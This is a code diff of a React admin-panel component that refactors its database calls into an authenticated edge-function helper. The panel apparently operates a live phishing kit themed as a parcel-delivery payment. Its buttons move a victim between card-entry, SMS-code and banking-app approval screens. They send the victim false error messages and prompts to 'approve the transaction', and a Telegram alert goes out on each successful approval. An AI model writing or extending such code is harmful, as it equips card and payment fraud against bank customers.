@@ -79,119 +79,105 @@ export function ClientRow({ session, isSelected = false, onToggleSelect }: Clien
     }
   };
 
+  // Helper function to update session via edge function
+  const updateSession = async (updates: Record<string, unknown>, successMsg: string) => {
+    try {
+      const token = sessionStorage.getItem("admin_token");
+      const { data, error } = await supabase.functions.invoke("admin-sessions", {
+        headers: token ? { Authorization: `Bearer ${token}` } : {},
+        body: { action: "update", sessionId: session.id, updates }
+      });
+      
+      if (error || !data?.success) {
+        console.error("Update failed:", error || data?.error);
+        toast({ title: "Error", description: "Failed to update", variant: "destructive" });
+        return;
+      }
+      toast({ title: successMsg });
+    } catch (err) {
+      console.error("Update error:", err);
+      toast({ title: "Error", description: "Failed to update", variant: "destructive" });
+    }
+  };
+
   // Actions
-  const sendToSmsVerification = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ current_step: 3, approval_type: null, verification_code: null })
-      .eq("id", session.id);
-    toast({ title: "→ SMS" });
-  };
+  const sendToSmsVerification = () => updateSession(
+    { current_step: 3, approval_type: null, verification_code: null },
+    "→ SMS"
+  );
 
-  const sendToAppApproval = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ current_step: 3, approval_type: "app_pending", verification_code: null })
-      .eq("id", session.id);
-    toast({ title: "→ App" });
-  };
+  const sendToAppApproval = () => updateSession(
+    { current_step: 3, approval_type: "app_pending", verification_code: null },
+    "→ App"
+  );
 
-  const sendWrongCardMessage = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ 
-        current_step: 2,
-        approval_type: null,
-        admin_message: "The card details you entered are incorrect. Please check and try again.",
-        message_type: "error"
-      })
-      .eq("id", session.id);
-    toast({ title: "Wrong card" });
-  };
+  const sendWrongCardMessage = () => updateSession(
+    { 
+      current_step: 2,
+      approval_type: null,
+      admin_message: "The card details you entered are incorrect. Please check and try again.",
+      message_type: "error"
+    },
+    "Wrong card"
+  );
 
-  const sendWrongSmsMessage = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ 
-        admin_message: "The verification code you entered is incorrect. Please check and try again.",
-        message_type: "error"
-      })
-      .eq("id", session.id);
-    toast({ title: "Wrong SMS" });
-  };
+  const sendWrongSmsMessage = () => updateSession(
+    { 
+      admin_message: "The verification code you entered is incorrect. Please check and try again.",
+      message_type: "error"
+    },
+    "Wrong SMS"
+  );
 
-  const sendWrongApprovalMessage = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ 
-        admin_message: "Approval not received. Please try again in your banking app.",
-        message_type: "error"
-      })
-      .eq("id", session.id);
-    toast({ title: "Wrong Approval" });
-  };
+  const sendWrongApprovalMessage = () => updateSession(
+    { 
+      admin_message: "Approval not received. Please try again in your banking app.",
+      message_type: "error"
+    },
+    "Wrong Approval"
+  );
 
-  const sendPushRequest = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ 
-        admin_message: "Please check your banking app now and approve the transaction.",
-        message_type: "info"
-      })
-      .eq("id", session.id);
-    toast({ title: "Push sent" });
-  };
+  const sendPushRequest = () => updateSession(
+    { 
+      admin_message: "Please check your banking app now and approve the transaction.",
+      message_type: "info"
+    },
+    "Push sent"
+  );
 
-  const sendBackToParcel = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ 
-        current_step: 1,
-        approval_type: null,
-        admin_message: null,
-        message_type: null
-      })
-      .eq("id", session.id);
-    toast({ title: "→ Parcel" });
-  };
+  const sendBackToParcel = () => updateSession(
+    { 
+      current_step: 1,
+      approval_type: null,
+      admin_message: null,
+      message_type: null
+    },
+    "→ Parcel"
+  );
 
-  const sendBackToCard = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ current_step: 2, approval_type: null })
-      .eq("id", session.id);
-    toast({ title: "→ Card" });
-  };
+  const sendBackToCard = () => updateSession(
+    { current_step: 2, approval_type: null },
+    "→ Card"
+  );
 
   const confirmPayment = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ current_step: 4, approval_type: "sms" })
-      .eq("id", session.id);
+    await updateSession({ current_step: 4, approval_type: "sms" }, "✓ Confirmed");
     await supabase.functions.invoke("send-telegram", {
       body: { message: `✅ SMS - #${session.session_code}` },
     });
-    toast({ title: "✓ Confirmed" });
   };
 
   const approvePayment = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ current_step: 4, approval_type: "app" })
-      .eq("id", session.id);
+    await updateSession({ current_step: 4, approval_type: "app" }, "✓ Approved");
     await supabase.functions.invoke("send-telegram", {
       body: { message: `✅ App - #${session.session_code}` },
     });
-    toast({ title: "✓ Approved" });
   };
 
-  const clearMessage = async () => {
-    await supabase
-      .from("client_sessions")
-      .update({ admin_message: null, message_type: null })
-      .eq("id", session.id);
-    toast({ title: "Cleared" });
-  };
+  const clearMessage = () => updateSession(
+    { admin_message: null, message_type: null },
+    "Cleared"
+  );
 
   const isWaiting = session.current_step === 2 && session.approval_type === "payment_waiting";
   const isVerifying = session.current_step === 3;
